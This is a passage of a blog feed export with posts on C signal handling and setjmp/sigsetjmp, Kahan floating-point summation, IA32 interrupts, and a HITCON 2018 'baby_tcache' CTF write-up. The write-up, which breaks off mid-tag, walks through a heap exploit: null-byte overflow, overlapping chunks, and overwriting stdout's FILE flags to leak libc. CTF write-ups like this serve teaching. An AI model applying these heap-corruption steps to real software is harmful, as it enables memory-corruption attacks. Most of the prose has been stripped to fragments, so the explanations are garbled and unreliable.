&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ctrl c&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">sigset_t</span> mask;</span><br><span class="line">    sigemptyset(&amp;mask);</span><br><span class="line">    sigaddset(&amp;mask, SIGINT);</span><br><span class="line">    sigprocmask(SIG_BLOCK,&amp;mask,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="type">__sighandler_t</span> rs = signal(SIGINT, signal_handler);</span><br><span class="line">    assert(rs != SIG_ERR);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; gcc -g -O2 -o test test.c</span><br><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line">^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^Z</span><br><span class="line">fish: Job 6, &#x27;./test&#x27; has stopped</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>0SIGFPE</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line">fish: Job 1, &#x27;./test&#x27; terminated by signal SIGFPE (Floating point exception)</span><br></pre></td></tr></table></figure><p>SIGFPE0</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">signal_handler</span><span class="params">(<span class="type">int</span> sig)</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">__sighandler_t</span> rs = signal(SIGFPE, signal_handler);</span><br><span class="line">    assert(rs != SIG_ERR);</span><br><span class="line">    <span class="type">int</span> z = <span class="number">12</span>;</span><br><span class="line">    <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">    z = z / t;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>z &#x3D; z &#x2F; t;SIGFPEgotogotojmp</p><p>setjmp</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">setjmp</span><span class="params">(jmp_buf env)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sigsetjmp</span><span class="params">(sigjmp_buf env, <span class="type">int</span> savesigs)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">longjmp</span><span class="params">(jmp_buf env, <span class="type">int</span> val)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">siglongjmp</span><span class="params">(sigjmp_buf env, <span class="type">int</span> val)</span>;</span><br></pre></td></tr></table></figure><p>setjmpenv(typically, the stack pointer, the instruction pointer,  possibly  the  values  of other registers and the signal mask),0</p><p>longjmpenvsetjmpval</p><p>sigsetjmpsetjmpsigsetjmp0jmpsigset</p><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sigsetjmp() and <span class="title function_">siglongjmp</span><span class="params">()</span></span><br><span class="line">       <span class="title function_">sigsetjmp</span><span class="params">()</span>  and  <span class="title function_">siglongjmp</span><span class="params">()</span> also perform nonlocal gotos, but provide</span><br><span class="line">       predictable handling of the process signal mask.</span><br><span class="line"></span><br><span class="line">       If, and only <span class="keyword">if</span>, the savesigs argument provided to <span class="title function_">sigsetjmp</span><span class="params">()</span> is  non</span><br><span class="line">       zero, the process&#x27;s current signal mask is saved in env and will be re</span><br><span class="line">       stored <span class="keyword">if</span> a <span class="title function_">siglongjmp</span><span class="params">()</span> is later performed with this env.</span><br></pre></td></tr></table></figure><p>sigpending()</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">jmp_buf env;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">sigset_t</span> mask, pendmask, blockmask;</span><br><span class="line">    sigemptyset(&amp;mask);</span><br><span class="line">    sigemptyset(&amp;pendmask);</span><br><span class="line">    sigemptyset(&amp;blockmask);</span><br><span class="line">    sigaddset(&amp;mask, SIGINT);</span><br><span class="line">    sigprocmask(SIG_BLOCK, &amp;mask, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// if (sigsetjmp(env, 666) != 0) &#123;</span></span><br><span class="line">        <span class="keyword">if</span> (setjmp(env) != <span class="number">0</span>) &#123;</span><br><span class="line">        sigpending(&amp;pendmask);</span><br><span class="line">        sigprocmask(SIG_BLOCK, <span class="literal">NULL</span>, &amp;blockmask);</span><br><span class="line">        <span class="keyword">if</span> (sigismember(&amp;blockmask, SIGINT))</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;in blockmask&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;not in blockmask&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (sigismember(&amp;pendmask, SIGINT))</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;in pendmask&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;not in pendmask&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">2</span>);<span class="comment">//ctrl c :)</span></span><br><span class="line">    <span class="comment">// siglongjmp(env, 1);</span></span><br><span class="line">    longjmp(env, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sigsetjmp</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line">^C^C^C^Cin blockmask</span><br><span class="line">in pendmask</span><br></pre></td></tr></table></figure><p>setjmp</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line">^C^C^C^Cin blockmask</span><br><span class="line">in pendmask</span><br></pre></td></tr></table></figure><p>WTF </p><p>gdb</p><p>setjmp(env) !&#x3D; 0</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p/x env</span><br><span class="line">$<span class="number">2</span> = &#123;&#123;</span><br><span class="line">    __jmpbuf = &#123;<span class="number">0x0</span>, <span class="number">0xfa3c37809f472823</span>, <span class="number">0x7fffffffdfd8</span>, <span class="number">0x555555555269</span>, <span class="number">0x555555557d78</span>, <span class="number">0x7ffff7ffd040</span>, <span class="number">0xfa3c378098a72823</span>, <span class="number">0xaf6962d587272823</span>&#125;,</span><br><span class="line">    __mask_was_saved = <span class="number">0x0</span>,</span><br><span class="line">    __saved_mask = &#123;</span><br><span class="line">      __val = &#123;<span class="number">0x0</span> &lt;repeats <span class="number">16</span> times&gt;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;&#125;</span><br></pre></td></tr></table></figure><p>sigsetjmp(env, 666) !&#x3D; 0</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p/x env</span><br><span class="line">$<span class="number">2</span> = &#123;&#123;</span><br><span class="line">    __jmpbuf = &#123;<span class="number">0x0</span>, <span class="number">0x6cdae548d2b8f980</span>, <span class="number">0x7fffffffdfd8</span>, <span class="number">0x555555555269</span>, <span class="number">0x555555557d78</span>, <span class="number">0x7ffff7ffd040</span>, <span class="number">0x6cdae548d558f980</span>, <span class="number">0x398fb01dcad2f980</span>&#125;,</span><br><span class="line">    __mask_was_saved = <span class="number">0x1</span>,</span><br><span class="line">    __saved_mask = &#123;</span><br><span class="line">      __val = &#123;<span class="number">0x2</span>, <span class="number">0x0</span> &lt;repeats <span class="number">15</span> times&gt;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;&#125;</span><br></pre></td></tr></table></figure><p>sigsetjmpsignal mask</p><p>sigsetjmpsetjmp</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">jmp_buf env;</span><br><span class="line"><span class="type">sigset_t</span> mask, pendmask, blockmask;</span><br><span class="line"><span class="type">void</span> <span class="title function_">signal_handler</span><span class="params">(<span class="type">int</span> sig)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nctrl+\\\n&quot;</span>);</span><br><span class="line">    siglongjmp(env, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// longjmp(env, 1);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    assert(sigemptyset(&amp;mask)==<span class="number">0</span>);</span><br><span class="line">    sigemptyset(&amp;pendmask);</span><br><span class="line">    sigemptyset(&amp;blockmask);</span><br><span class="line">    sigaddset(&amp;mask, SIGINT);</span><br><span class="line">    sigprocmask(SIG_BLOCK, &amp;mask, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="type">__sighandler_t</span> rs = signal(SIGQUIT, signal_handler);<span class="comment">/*ctrl+\*/</span></span><br><span class="line">    assert(rs != SIG_ERR);</span><br><span class="line">    <span class="keyword">if</span> (sigsetjmp(env, <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// if (setjmp(env) != 0) &#123;</span></span><br><span class="line">        sigpending(&amp;pendmask);</span><br><span class="line">        sigprocmask(SIG_BLOCK, <span class="literal">NULL</span>, &amp;blockmask);</span><br><span class="line">        <span class="keyword">if</span> (sigismember(&amp;blockmask, SIGINT))</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;in blockmask&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;not in blockmask&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        sigprocmask(SIG_UNBLOCK, &amp;mask, <span class="literal">NULL</span>);<span class="comment">//</span></span><br><span class="line">    sleep(<span class="number">2</span>);<span class="comment">/*ctrl+\*/</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sigsetjmp</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line">^\</span><br><span class="line">ctrl+\</span><br><span class="line">in blockmask</span><br></pre></td></tr></table></figure><p>setjmp</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line">^\</span><br><span class="line">ctrl+\</span><br><span class="line">not in blockmask</span><br></pre></td></tr></table></figure><p></p><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">jmp_buf env;</span><br><span class="line"><span class="type">void</span> <span class="title function_">signal_handler</span><span class="params">(<span class="type">int</span> sig)</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">    siglongjmp(env, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">__sighandler_t</span> rs = signal(SIGFPE, signal_handler);</span><br><span class="line">    assert(rs != SIG_ERR);</span><br><span class="line">    <span class="type">int</span> z = <span class="number">12</span>;</span><br><span class="line">    <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (sigsetjmp(env, <span class="number">1</span>) ==<span class="number">0</span> ) &#123;</span><br><span class="line">        z = z / t;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, z); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line">xxx</span><br><span class="line">12</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kahan</title>
      <link href="/2023/04/23/floating-point-calculation-and-kahan/"/>
      <url>/2023/04/23/floating-point-calculation-and-kahan/</url>
      
        <content type="html"><![CDATA[<h2 id="Floating-point-Calculation"><a href="#Floating-point-Calculation" class="headerlink" title="Floating-point Calculation"></a>Floating-point Calculation</h2><p>Kahan</p><p>A&#x3D;Ma*2<sup>Ea</sup></p><p>B&#x3D;Mb*2<sup>Eb</sup></p><p>(Ea&gt;&#x3D;Eb)</p><p>AB&#x3D;(MaMb*2<sup>Eb-Ea</sup>)*2<sup>Ea</sup></p><p>A*B&#x3D;(Ma*Mb)*2<sup>Ea+Eb</sup></p><p>A&#x2F;B&#x3D;(Ma&#x2F;Mb)*2<sup>Ea-Eb</sup></p><p></p><p></p><ul><li>0</li><li>&gt; 127 inf</li><li>&lt; -126 0</li><li> 11.01 42(11.)1(1.)</li><li>0.11 </li><li></li></ul><p></p><p>IEEE 754rounding</p><ul><li>()<ul><li>(0)</li></ul></li><li>+inf</li><li>-inf</li><li>0</li></ul><h2 id="Kahan"><a href="#Kahan" class="headerlink" title="Kahan"></a>Kahan</h2><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> TIMES 40000000</span></span><br><span class="line"><span class="type">float</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="type">float</span> test;</span><br><span class="line">test= <span class="number">1234567890</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%f\n&quot;</span>,test);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; TIMES; i++)&#123;</span><br><span class="line">    sum += <span class="number">0.1</span>;</span><br><span class="line">&#125;</span><br><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; gcc -O2 -o test test.c</span><br><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line"><span class="number">1234567936.000000</span></span><br><span class="line"><span class="number">2097152.000000</span></span><br></pre></td></tr></table></figure><p></p><p></p><p>0.1 0 01111011 10011001100110011001101 1001()(0.0)231 log(2<sup>24</sup>)7</p><p><strong>Kahan</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; TIMES; i++)&#123;</span><br><span class="line">    y = <span class="number">0.1</span> - c;</span><br><span class="line">    t = sum2 + y;</span><br><span class="line">    c = (t - sum2) - y;</span><br><span class="line">    sum2 = t;</span><br><span class="line">&#125;</span><br><span class="line">sum2-=c</span><br></pre></td></tr></table></figure><p></p><p>c</p><p>sum2ytsum2()()</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TIMES 400000000</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">float</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">float</span> sum2 = <span class="number">0</span>, y = <span class="number">0</span>, t = <span class="number">0</span>, c = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; TIMES; i++) &#123;</span><br><span class="line">        sum += <span class="number">0.1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; TIMES; i++) &#123;</span><br><span class="line">        y = <span class="number">0.1</span> - c;</span><br><span class="line">        t = sum2 + y;</span><br><span class="line">        c = (t - sum2) - y;</span><br><span class="line">        sum2 = t;</span><br><span class="line">    &#125;</span><br><span class="line">    sum2 -= c;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%f\n&quot;</span>, sum);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%f&quot;</span>, sum2);</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; gcc -O2 -o test test.c</span><br><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line">2097152.000000</span><br><span class="line">40000000.000000  </span><br></pre></td></tr></table></figure><p>TIMES02097152.000000,0.101111011&#x3D;123-127&#x3D;-4209715210010100&#x3D;148-127&#x3D;21</p><p>0.125124</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>IA32(Interrupt And Exception)</title>
      <link href="/2023/04/22/IA32-Interrupt-Exception/"/>
      <url>/2023/04/22/IA32-Interrupt-Exception/</url>
      
        <content type="html"><![CDATA[<h1 id="IA32-Interrupt-And-Exception"><a href="#IA32-Interrupt-And-Exception" class="headerlink" title="IA32 Interrupt And Exception"></a>IA32 Interrupt And Exception</h1><p></p><p>intel,RTFM!!!64-ia-32-architectures-software-developer-vol-3a-part-1-manualchapter 6</p><p><a href="https://www.intel.cn/content/www/cn/zh/architecture-and-technology/64-ia-32-architectures-software-developer-vol-3a-part-1-manual.html">https://www.intel.cn/content/www/cn/zh/architecture-and-technology/64-ia-32-architectures-software-developer-vol-3a-part-1-manual.html</a></p><h3 id="EFLAGS"><a href="#EFLAGS" class="headerlink" title="EFLAGS"></a>EFLAGS</h3><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230422194723461.png" alt="image-20230422194723461"></p><h2 id="Interrupt"><a href="#Interrupt" class="headerlink" title="Interrupt"></a>Interrupt</h2><p>The processor receives interrupts from two sources:<br> External (hardware generated) interrupts.<br> Software-generated interrupts.(int nn)</p><p>CPUcpu</p><p>cpu</p><p>INTRINTeRrupt(maskable interrupt)INTRCPU</p><p>NMINon Maskable Interrupt(nonmaskable interrupt)NMICPU</p><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230422194043252.png" alt="image-20230422194043252"></p><p>CLIEFLAGSIF(Interrupt enable Flag)(IF&#x3D;0)STI(IF&#x3D;1)(IA32IF&#x3D;0)</p><p></p><h2 id="Exception"><a href="#Exception" class="headerlink" title="Exception"></a>Exception</h2><p>The processor receives exceptions from three sources:<br> Processor-detected program-error exceptions.<br> Software-generated exceptions.<br> Machine-check exceptions.</p><p>CPU,IF</p><ul><li><p>(Fault)</p><blockquote><p></p><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230422202900753.png" alt="image-20230422202900753"></p></blockquote></li><li><p>(Traps)</p><blockquote><p>cpuint n()int3, into()bound(),ud2()</p></blockquote></li><li><p>(Aborts)</p><blockquote><p>abort</p></blockquote></li></ul><h2 id="Interrupt-Vector-TableIVT"><a href="#Interrupt-Vector-TableIVT" class="headerlink" title="Interrupt Vector TableIVT"></a>Interrupt Vector TableIVT</h2><p></p><p>1MBOIS00000H~003ffh 1kb4256BIOSINT</p><h2 id="Interrupt-Descriptor-TableIDT"><a href="#Interrupt-Descriptor-TableIDT" class="headerlink" title="Interrupt Descriptor TableIDT"></a>Interrupt Descriptor TableIDT</h2><p></p><p>IDTRIDTlidtidtrGDTR32idt1601</p><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230422230738609.png" alt="image-20230422230738609"></p><p>IDT8Gate Descriptor</p><p></p><p>S&#x3D;0S&#x3D;1TYPES</p><p>S&#x3D;0TYPE</p><p> 0101 </p><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230422232250447.png" alt="image-20230422232250447"></p><p> D110   IF 0</p><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230422232346158.png" alt="image-20230422232346158"></p><p> D111  IF0</p><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230422232525942.png" alt="image-20230422232525942"></p><p>D160321DPL </p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>CPUIDTRIDT+*8</p><p>INT3 int n INTOCPLDPLCPLDPL</p><p>CPLDPL</p><p>DPL</p><p>cs eip</p><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230423013430409.png" alt="image-20230423013430409"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>CPLDPL</p><p>&gt;&gt;&gt;CPLDPLssespTSSDPLssespssespeflagscseip,</p><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230423020740539.png" alt="image-20230423020740539"></p><p>&gt;&gt;&gt;CPL&#x3D;DPLss esp</p><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230423021021604.png" alt="image-20230423021021604"></p><p>cs eiiretireteip cs eflagsiretespeip</p><p>iretss:esp</p><h2 id="IA32"><a href="#IA32" class="headerlink" title="IA32"></a>IA32</h2><p>0-255</p><p>0-31cpu32-255</p><table><thead><tr><th></th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>32-255</td><td></td><td></td><td></td><td>INTRINT n</td><td></td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2018 HITCON PWN baby_tcache</title>
      <link href="/2023/04/19/HITCON-2018-PWN-baby-tcache/"/>
      <url>/2023/04/19/HITCON-2018-PWN-baby-tcache/</url>
      
        <content type="html"><![CDATA[<p><a href="https://pan.baidu.com/s/1LiWzcGrrdDOI3gH6EXhQzA">https://pan.baidu.com/s/1LiWzcGrrdDOI3gH6EXhQzA</a><br>79ui</p><p>libc2.27</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/c/p/heap&gt; checksec baby_tcache</span><br><span class="line">[*] &#x27;/mnt/hgfs/Share/ctfwiki/pwn/heap/baby_tcache&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>adddelete10chunk</p><p>new<code> v3[size] = 0;</code>null byte one</p><p>overlapping chunk freehooklibc</p><p>printfputsprintfIOFILEputs</p><p><code>libio/ioputs.c</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_puts (<span class="type">const</span> <span class="type">char</span> *str)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = EOF;</span><br><span class="line">  _IO_size_t len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_acquire_lock (_IO_stdout);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (_IO_stdout) != <span class="number">0</span></span><br><span class="line">       || _IO_fwide (_IO_stdout, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">&#x27;\n&#x27;</span>, _IO_stdout) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  _IO_release_lock (_IO_stdout);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_IO_sputnfwrite<code>_IO_2_1_stdout_</code>_IO_write_base~IO_write_ptrsetvbufsetvbuf_IO_2_1_stdout_flagbitflag?</p><p>_IO_2_1_stdout_binlibcoverlappingfreehook</p><h3 id="overlapping-chunk"><a href="#overlapping-chunk" class="headerlink" title="overlapping chunk"></a>overlapping chunk</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x500</span>-<span class="number">0x8</span>)  <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x40</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x50</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x500</span> - <span class="number">0x8</span>) <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x70</span>) <span class="comment"># 6 //05topchunk</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span> + <span class="string">b&#x27;\x60\x06&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>6</p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419233901431.png" alt="image-20230419233901431" style="zoom:80%;"><p>505prevsizeprevinuse</p><p>5freeprevsize&#x3D;0x500+0x40+0x50+0x60+0x70&#x3D;0x660</p><p>40x68chunknull byte overflow 5prevsizeprevinuse</p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419234348442.png" alt="image-20230419234348442"></p><p>05unlinkoverlapping</p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419234533161.png" alt="image-20230419234533161"></p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419234624496.png" alt="image-20230419234624496"></p><p>0x660+0x500&#x3D;0xB60</p><p>2bin</p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419234602649.png" alt="image-20230419234602649"></p><h3 id="IO-2-1-stdout"><a href="#IO-2-1-stdout" class="headerlink" title="IO_2_1_stdout"></a>IO_2_1_stdout</h3><p>unsortedbintcachebin2fdunsortedbin</p><p>0x500+0x40chunkhead0x530</p><p>add(0x530)</p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419235740115.png" alt="image-20230419235740115"></p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419235803167.png" alt="image-20230419235803167"></p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420000100153.png" alt="image-20230420000100153"></p><p>1790chunkfd</p><p><code>add(0xa0, b&#39;\x60\xc7&#39;)</code></p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420000346155.png" alt="image-20230420000346155"></p><h3 id="libc"><a href="#libc" class="headerlink" title="libc"></a>libc</h3><p>stdout</p><p>flag</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC 0xFBAD0000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_WRITES 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_APPENDING 0x1000</span></span><br></pre></td></tr></table></figure><p>flag&#x3D;0xFBAD1800</p><p><code>add(0x40)</code></p><p><code>add(0x3f,p64(0xfbad1800) + p64(0) * 3 + b&#39;\x00&#39;)</code></p><p>3f0x40v3[size] &#x3D; 0;0x7ffff7bec760+sizestdoutIO_FILEcrash</p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420003158991.png" alt="image-20230420003158991"></p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420003516321.png" alt="image-20230420003516321"></p><p>0x3e 0x3f 0x47 0x48</p><p></p><p><img 